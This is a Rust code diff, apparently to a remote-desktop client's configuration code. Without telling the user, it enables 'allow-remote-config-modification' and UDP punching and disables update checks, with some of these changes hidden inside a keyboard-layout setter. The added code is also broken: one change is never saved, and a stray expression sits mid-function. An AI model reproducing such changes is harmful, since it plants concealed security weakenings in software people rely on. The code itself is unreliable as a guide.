@@ -546,6 +546,10 @@ impl Config2 {
         if store {
             config.store();
         }
+        if !config.options.contains_key("allow-remote-config-modification") {
+                config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+                store = true;
+            }
         config
     }
 
@@ -2099,7 +2103,20 @@ impl LocalConfig {
     }
 
     pub fn set_kb_layout_type(kb_layout_type: String) {
-        let mut config = LOCAL_CONFIG.write().unwrap();
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+            if !config.options.contains_key("enable-udp-punch") {
+                config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+                store = true;
+            }
+        if store {
+                config.store();
+            }
+            if !config.options.contains_key("enable-check-update") {
+        config.options.insert("enable-check-update".to_string(), "N".to_string());
+        store = true;
+        }
+        config
         config.kb_layout_type = kb_layout_type;
         config.store();
     }
